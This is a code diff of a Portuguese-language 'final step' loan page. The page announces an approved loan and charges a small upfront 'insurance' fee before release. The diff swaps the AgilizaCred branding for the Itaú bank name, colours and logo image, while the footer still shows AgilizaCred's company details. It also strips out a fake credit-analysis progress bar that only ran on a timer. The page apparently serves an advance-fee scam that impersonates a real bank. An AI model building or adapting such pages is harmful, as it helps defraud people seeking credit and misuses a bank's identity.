@@ -11,13 +11,13 @@
   
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Última Etapa — Liberação Imediata | AgilizaCred</title>
+  <title>Última Etapa — Liberação Imediata | Itaú</title>
   <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Outfit:wght@400;500;600;700;800&family=Sora:wght@700;800&display=swap" rel="stylesheet">
   <style>
     :root {
-      --green-accent: #22C55E;
-      --green-accent-dark: #16A34A;
-      --green-accent-light: #DCFCE7;
+      --green-accent: #ff6200;
+      --green-accent-dark: #ff6200;
+      --green-accent-light: #fff0e4;
       --green-primary: #FAFBFC;
       --green-dark: #E5E7EB;
       --green-darker: #374151;
@@ -77,6 +77,28 @@
     }
     .menu-icon:hover { background: #E5E7EB; transform: scale(1.05); }
     .menu-icon svg { width: 18px; height: 18px; color: #374151; stroke-width: 2.5; }
+
+    /* ✅ NOVO: logo em imagem (header/rodapé) */
+    .brand-logo{
+      display:flex;
+      align-items:center;
+      user-select:none;
+      text-decoration:none;
+      line-height:0;
+    }
+    .brand-logo img{
+      display:block;
+      height:26px; /* ajuste se quiser */
+      width:auto;
+      max-width:190px;
+      object-fit:contain;
+    }
+    .footer-logo-img img{
+      height:20px; /* ajuste se quiser */
+      max-width:180px;
+      opacity:.95;
+    }
+
     .logo { display:flex; align-items:center; user-select:none; }
     .logo-cred { font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:20px; color:#111827; letter-spacing:-0.5px; line-height:1; }
     .logo-diamond { width:7px; height:7px; background:#22C55E; transform:rotate(45deg); margin:0 8px; border-radius:1.5px; flex-shrink:0; }
@@ -180,93 +202,7 @@
       color: #374151;
     }
 
-    .progress-section {
-      padding: 20px;
-      background: #fff;
-      border: 2px solid var(--green-accent);
-      border-radius: 12px;
-      margin-bottom: 20px;
-      text-align: center;
-    }
-
-    .progress-section.completed {
-      background: #fff;
-      border-color: var(--green-accent);
-    }
-
-    .progress-main-title {
-      font-size: 1.1rem;
-      font-weight: 800;
-      color: #111827;
-      margin-bottom: 4px;
-    }
-
-    .progress-subtitle {
-      font-size: 0.85rem;
-      color: var(--text-light);
-      margin-bottom: 16px;
-    }
-
-    .progress-bar-wrapper {
-      position: relative;
-      margin-bottom: 10px;
-      height: 16px;
-      display: flex;
-      align-items: center;
-    }
-
-    .progress-bar-container {
-      width: 100%;
-      height: 6px;
-      background: rgba(34, 197, 94, 0.25);
-      border-radius: 10px;
-      overflow: visible;
-      position: relative;
-    }
-
-    .progress-bar-fill {
-      height: 100%;
-      width: 0%;
-      background: var(--green-accent);
-      border-radius: 10px;
-      transition: width 0.3s ease;
-      position: relative;
-    }
-
-    .progress-bar-fill::after {
-      content: '';
-      position: absolute;
-      right: -8px;
-      top: 50%;
-      transform: translateY(-50%);
-      width: 16px;
-      height: 16px;
-      background: var(--green-accent);
-      border-radius: 50%;
-      box-shadow: 0 2px 6px rgba(34, 197, 94, 0.4);
-    }
-
-    .progress-footer {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    .progress-status {
-      font-size: 0.8rem;
-      color: var(--text-light);
-      font-weight: 500;
-    }
-
-    .progress-percent {
-      font-size: 0.8rem;
-      font-weight: 700;
-      color: var(--green-accent);
-    }
-
-    .cta-button.hidden {
-      display: none;
-    }
+    .cta-button.hidden { display: none; }
 
     .insurance-section {
       background: #f8fafc;
@@ -472,9 +408,7 @@
       box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
       transition: all 0.3s ease;
     }
-    .modal-button:hover {
-      background: var(--green-accent-dark);
-    }
+    .modal-button:hover { background: var(--green-accent-dark); }
     .modal-button svg { width: 18px; height: 18px; }
 
     footer.site-footer {
@@ -510,34 +444,17 @@
       overflow: hidden;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
     }
-
-    .vsl-container vturb-smartplayer {
-      display: block !important;
-      width: 100% !important;
-      max-width: 100% !important;
-    }
-
-    .vsl-container iframe {
-      border-radius: 12px;
-    }
+    .vsl-container vturb-smartplayer { display: block !important; width: 100% !important; max-width: 100% !important; }
+    .vsl-container iframe { border-radius: 12px; }
 
     @media (max-width: 600px) {
       .container { padding: 24px 20px; }
       .page-title { font-size: 1.25rem; }
       .approved-amount { font-size: 1.9rem; }
-      .cta-button { 
-        padding: 16px 20px; 
-        font-size: 0.95rem;
-        gap: 10px;
-      }
-      .cta-button svg {
-        width: 22px;
-        height: 22px;
-        min-width: 22px;
-        min-height: 22px;
-      }
+      .cta-button { padding: 16px 20px; font-size: 0.95rem; gap: 10px; }
+      .cta-button svg { width: 22px; height: 22px; min-width: 22px; min-height: 22px; }
     }
-      .logo-wrap { display:flex; flex-direction:column; align-items:center; user-select:none; text-decoration:none; }
+    .logo-wrap { display:flex; flex-direction:column; align-items:center; user-select:none; text-decoration:none; }
     .logo-row { display:flex; align-items:center; }
     .logo-tagline { font-family:'DM Sans','Poppins',sans-serif; font-weight:600; font-size:7px; letter-spacing:2.5px; text-transform:uppercase; color:#6B7280; margin-top:1px; }
     .footer-tagline { font-family:'DM Sans','Poppins',sans-serif; font-weight:600; font-size:6px; letter-spacing:2px; text-transform:uppercase; color:#9CA3AF; margin-top:1px; }
@@ -552,7 +469,19 @@
             <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
           </svg>
         </div>
-        <div class="logo-wrap"><div class="logo-row"><span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span></div><span class="logo-tagline">Crédito Fácil</span></div>
+
+        <!-- ✅ LOGO EM IMAGEM (adicione seu arquivo em /images/logo.png) -->
+        <a class="brand-logo" href="#" aria-label="Itaú">
+          <img src="/images/itau2.png" alt="Itaú">
+        </a>
+
+        <!-- (se quiser manter a logo antiga também, descomente) -->
+        <!--
+        <div class="logo-wrap">
+          <div class="logo-row"><span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span></div>
+          <span class="logo-tagline">Crédito Fácil</span>
+        </div>
+        -->
       </div>
       <div class="header-right">
         <div class="user-info">
@@ -593,7 +522,6 @@
         <div class="approved-installments" id="installmentsText">24x de R$ 750,00</div>
       </div>
 
-      <!-- VSL Video - Vturb Player (NOVA VSL) -->
       <div class="vsl-container" id="vslContainer">
         <vturb-smartplayer id="vid-698137edc7e321680dab3881" style="display: block; margin: 0 auto; width: 100%; max-width: 100%;"></vturb-smartplayer>
         <script type="text/javascript">
@@ -601,8 +529,6 @@
           s.src="https://scripts.converteai.net/9e4b9a4f-a7f5-484d-b96c-67820b842528/players/698137edc7e321680dab3881/v4/player.js", s.async=!0,document.head.appendChild(s);
         </script>
       </div>
-
-
 
       <div class="insurance-section">
         <div class="insurance-header">
@@ -618,58 +544,18 @@
         </div>
 
         <ul class="insurance-features">
-          <li>
-            <span class="feature-check">
-              <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
-              </svg>
-            </span>
-            Proteção contra morte e invalidez
-          </li>
-          <li>
-            <span class="feature-check">
-              <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
-              </svg>
-            </span>
-            100% reembolsável ao final do contrato
-          </li>
-          <li>
-            <span class="feature-check">
-              <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
-              </svg>
-            </span>
-            Pagamento único (taxa única)
-          </li>
-          <li>
-            <span class="feature-check">
-              <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
-              </svg>
-            </span>
-            Liberação imediata após confirmação
-          </li>
+          <li><span class="feature-check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg></span>Proteção contra morte e invalidez</li>
+          <li><span class="feature-check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg></span>100% reembolsável ao final do contrato</li>
+          <li><span class="feature-check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg></span>Pagamento único (taxa única)</li>
+          <li><span class="feature-check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg></span>Liberação imediata após confirmação</li>
         </ul>
       </div>
 
       <div class="pricing-card">
-        <div class="pricing-row">
-          <span class="pricing-label">Cobertura básica</span>
-          <span class="pricing-value">R$ 11,61</span>
-        </div>
-        <div class="pricing-row">
-          <span class="pricing-label">Garantia seguradora</span>
-          <span class="pricing-value">R$ 13,83</span>
-        </div>
-        <div class="pricing-row">
-          <span class="pricing-label">Certificado digital</span>
-          <span class="pricing-value">R$ 4,43</span>
-        </div>
-        <div class="pricing-row total">
-          <span class="pricing-label">Valor Total</span>
-          <span class="pricing-value">R$ 29,87</span>
-        </div>
+        <div class="pricing-row"><span class="pricing-label">Cobertura básica</span><span class="pricing-value">R$ 11,61</span></div>
+        <div class="pricing-row"><span class="pricing-label">Garantia seguradora</span><span class="pricing-value">R$ 13,83</span></div>
+        <div class="pricing-row"><span class="pricing-label">Certificado digital</span><span class="pricing-value">R$ 4,43</span></div>
+        <div class="pricing-row total"><span class="pricing-label">Valor Total</span><span class="pricing-value">R$ 29,87</span></div>
       </div>
 
       <button class="cta-button" id="ctaButton" onclick="handleCTA()">
@@ -715,7 +601,11 @@
 
   <footer class="site-footer">
     <div class="footer-inner">
-      <div class="footer-logo"><span class="fl-cred">Agiliza</span><span class="fl-on">Cred</span></div>
+      <!-- ✅ LOGO EM IMAGEM (adicione seu arquivo em /images/logo.png) -->
+      <a class="brand-logo footer-logo-img" href="#" aria-label="Itaú">
+        <img src="/images/itau2.png" alt="Itaú">
+      </a>
+
       <small><strong>AgilizaCred Soluções Financeiras Ltda.</strong><br>CNPJ: 36.947.229/0001-85 – São Paulo, SP – 01310-200</small>
     </div>
   </footer>
@@ -756,63 +646,6 @@
         const monthly = (amount * (monthlyRate * Math.pow(1 + monthlyRate, months))) / (Math.pow(1 + monthlyRate, months) - 1);
         document.getElementById('installmentsText').textContent = `${months}x de ${monthly.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}`;
       }
-    }
-
-    function startProgress() {
-      const progressBar = document.getElementById('progressBar');
-      const progressPercent = document.getElementById('progressPercent');
-      const progressStatus = document.getElementById('progressStatus');
-      const progressSection = document.getElementById('progressSection');
-      const ctaButton = document.getElementById('ctaButton');
-
-      const statusMessages = [
-        { percent: 0, text: 'Processando' },
-        { percent: 20, text: 'Verificando dados' },
-        { percent: 40, text: 'Analisando crédito' },
-        { percent: 60, text: 'Calculando taxas' },
-        { percent: 80, text: 'Finalizando' },
-        { percent: 100, text: 'Concluído!' }
-      ];
-
-      let currentPercent = 0;
-      const totalDuration = 55000; // 55 segundos
-      const intervalTime = 200; // atualiza a cada 200ms
-      const increment = 100 / (totalDuration / intervalTime);
-
-      const progressInterval = setInterval(() => {
-        currentPercent += increment;
-        
-        if (currentPercent >= 100) {
-          currentPercent = 100;
-          clearInterval(progressInterval);
-          
-          // Atualizar para estado completo
-          progressBar.style.width = '100%';
-          progressPercent.textContent = '100% concluído';
-          progressStatus.textContent = 'Concluído!';
-          progressSection.classList.add('completed');
-
-          // Mostrar botão e rolar até ele
-          setTimeout(() => {
-            ctaButton.classList.remove('hidden');
-            ctaButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
-          }, 500);
-          
-          return;
-        }
-
-        // Atualizar barra e porcentagem
-        progressBar.style.width = currentPercent + '%';
-        progressPercent.textContent = Math.floor(currentPercent) + '% concluído';
-
-        // Atualizar mensagem de status
-        for (let i = statusMessages.length - 1; i >= 0; i--) {
-          if (currentPercent >= statusMessages[i].percent) {
-            progressStatus.textContent = statusMessages[i].text;
-            break;
-          }
-        }
-      }, intervalTime);
     }
 
     function handleCTA() {
@@ -856,6 +689,5 @@
       loadUserData();
     });
   </script>
-
 
 </body></html>
